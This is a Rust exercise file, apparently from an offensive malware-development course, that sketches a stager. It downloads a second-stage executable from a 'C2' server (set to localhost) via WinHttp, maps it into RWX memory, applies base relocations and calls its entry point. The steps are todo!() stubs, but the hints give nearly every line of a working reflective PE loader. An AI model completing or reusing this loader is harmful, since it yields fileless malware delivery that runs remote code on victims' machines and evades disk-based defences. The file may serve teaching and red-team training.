use std::ffi::c_void;
use std::mem;
use windows::Win32::Networking::WinHttp::{
    WinHttpCloseHandle, WinHttpConnect, WinHttpOpen, WinHttpOpenRequest,
    WinHttpQueryDataAvailable, WinHttpReadData, WinHttpReceiveResponse, WinHttpSendRequest,
    WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
};
use windows::Win32::System::Diagnostics::Debug::{
    IMAGE_BASE_RELOCATION, IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER,
};
use windows::Win32::System::Memory::{
    MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAlloc,
};
use windows::core::PCWSTR;

// URL of the second-stage PE served by the C2.
// Run: cargo build --target x86_64-pc-windows-gnu -p stage-two-payload
//      python3 -m http.server 8080  (from the directory with stage_two_payload.exe)
const STAGE_HOST: &str = "127.0.0.1";
const STAGE_PORT: u16 = 8080;
const STAGE_PATH: &str = "/stage_two_payload.exe";

fn to_wide_null(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

fn http_get(host: &str, port: u16, path: &str) -> Vec<u8> {
    // Download arbitrary bytes over HTTP using WinHttp.
    // Identical pattern to Module 25: open session → connect → open request →
    // send → receive response → read loop → close handles.
    //
    // Hint: WinHttpOpen / WinHttpConnect / WinHttpOpenRequest / WinHttpSendRequest
    //       / WinHttpReceiveResponse — see Module 25 README for full signatures.
    //       WinHttpQueryDataAvailable + WinHttpReadData in a loop; stop when
    //       available == 0.
    unsafe {
        todo!("implement http_get — download the stage-two PE bytes over HTTP")
    }
}

fn main() {
    unsafe {
        // Step 1 — Download the stage-two PE from the C2 server.
        // http_get returns the raw .exe bytes as a Vec<u8>.
        let pe_bytes: Vec<u8> = todo!("http_get(STAGE_HOST, STAGE_PORT, STAGE_PATH)");
        assert!(!pe_bytes.is_empty(), "stage-two download returned empty response");

        // Step 2 — Parse the PE headers locally.
        // Cast into pe_bytes using raw pointer arithmetic — same as Module 04/07.
        //
        // Hint: let dos  = pe_bytes.as_ptr() as *const IMAGE_DOS_HEADER;
        //       let e_lfanew = (*dos).e_lfanew as usize;
        //       let nt   = pe_bytes.as_ptr().add(e_lfanew) as *const IMAGE_NT_HEADERS64;
        let dos: *const IMAGE_DOS_HEADER = todo!("cast pe_bytes.as_ptr() to *const IMAGE_DOS_HEADER");
        let nt: *const IMAGE_NT_HEADERS64 = todo!("pe_bytes.as_ptr().add((*dos).e_lfanew as usize) as *const IMAGE_NT_HEADERS64");

        let preferred_base = todo!("(*nt).OptionalHeader.ImageBase as usize");
        let image_size     = todo!("(*nt).OptionalHeader.SizeOfImage as usize");
        let header_size    = todo!("(*nt).OptionalHeader.SizeOfHeaders as usize");
        let entry_rva      = todo!("(*nt).OptionalHeader.AddressOfEntryPoint as usize");
        let num_sections   = todo!("(*nt).FileHeader.NumberOfSections as usize");
        // Save the relocation directory for step 6:
        // let reloc_dir = (*nt).OptionalHeader.DataDirectory[5];

        // Step 3 — Allocate RWX memory for the mapped image.
        // Try preferred_base first; the OS may give a different address.
        //
        // Hint: VirtualAlloc(
        //     lpaddress: Option<*const c_void>,          // Some(preferred_base as *const c_void)
        //     dwsize: usize,                             // image_size
        //     flallocationtype: VIRTUAL_ALLOCATION_TYPE, // MEM_COMMIT | MEM_RESERVE
        //     flprotect: PAGE_PROTECTION_FLAGS,          // PAGE_EXECUTE_READWRITE
        // ) -> *mut c_void                               // null on failure
        let alloc_base: *mut u8 = todo!("VirtualAlloc at preferred_base, image_size, PAGE_EXECUTE_READWRITE") as *mut u8;
        assert!(!alloc_base.is_null(), "VirtualAlloc failed");

        // Step 4 — Copy PE headers into alloc_base.
        //
        // Hint: std::ptr::copy_nonoverlapping(
        //     src: *const u8,   // pe_bytes.as_ptr()
        //     dst: *mut u8,     // alloc_base
        //     count: usize,     // header_size
        // )
        todo!("copy PE headers: copy_nonoverlapping(pe_bytes.as_ptr(), alloc_base, header_size)");

        // Step 5 — Copy each section's raw data to its virtual address.
        // Section headers begin at: pe_bytes.as_ptr() + (*dos).e_lfanew + size_of::<IMAGE_NT_HEADERS64>()
        //
        // Hint: let sections = pe_bytes.as_ptr()
        //           .add((*dos).e_lfanew as usize + mem::size_of::<IMAGE_NT_HEADERS64>())
        //           as *const IMAGE_SECTION_HEADER;
        //       for i in 0..num_sections {
        //           let sec = &*sections.add(i);
        //           let dst = alloc_base.add(sec.VirtualAddress as usize);
        //           let src = pe_bytes.as_ptr().add(sec.PointerToRawData as usize);
        //           copy_nonoverlapping(src, dst, sec.SizeOfRawData as usize);
        //       }
        todo!("copy each section: alloc_base + section.VirtualAddress ← pe_bytes + section.PointerToRawData");

        // Step 6 — Apply base relocations if alloc_base != preferred_base.
        // Walk DataDirectory[5] (.reloc): sequence of IMAGE_BASE_RELOCATION blocks.
        // For each DIR64 entry (top 4 bits == 0xA): read 8 bytes at
        //   alloc_base + block.VirtualAddress + entry_offset, add delta, write back.
        //
        // Hint: let delta = alloc_base as isize - preferred_base as isize;
        //       Only enter the loop if delta != 0.
        //       Same reloc walk as Module 04 step 8 — see that README for the block structure.
        todo!("apply base relocations if alloc_base as usize != preferred_base");

        // Step 7 — Call the entry point.
        // The entry point is a stdcall function that takes no arguments.
        // Transmute the address to a function pointer and call it.
        //
        // Hint: let ep_addr = alloc_base as usize + entry_rva;
        //       let ep: unsafe extern "system" fn() = mem::transmute(ep_addr);
        //       ep();
        todo!("transmute(alloc_base as usize + entry_rva) to fn() and call it");
    }
}
